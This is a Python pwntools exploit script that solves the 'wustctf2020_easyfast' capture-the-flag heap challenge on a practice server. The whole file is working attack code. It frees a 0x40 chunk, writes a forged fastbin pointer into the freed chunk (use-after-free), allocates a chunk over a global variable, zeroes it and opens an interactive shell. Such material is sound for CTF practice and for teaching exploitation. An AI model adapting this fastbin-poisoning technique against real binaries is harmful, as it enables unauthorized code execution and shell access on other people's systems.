#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/06/09 20:51:23
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = 'amd64'
if debug:
    sh = process('wustctf2020_easyfast')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    IP = 'node3.buuoj.cn'
    port = 27907
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
elf = ELF('wustctf2020_easyfast')

def cmd(choice):
    sh.recvuntil("choice>\n")
    sh.sendline(str(choice))

def add(size):
    cmd(1)
    sh.recvuntil("size>\n")
    sh.sendline(str(size))

def dele(idx):
    cmd(2)
    sh.recvuntil("index>\n")
    sh.sendline(str(idx))

def edit(idx,content):
    cmd(3)
    sh.recvuntil("index>\n")
    sh.sendline(str(idx))
    sleep(0.1)
    sh.send(content)

ptr = 0x602090

add(0x40)
add(0x40)
dele(0)
edit(0,p64(ptr-0x10))

add(0x40)
add(0x40)
edit(3,p64(0))
cmd(4)
sh.interactive()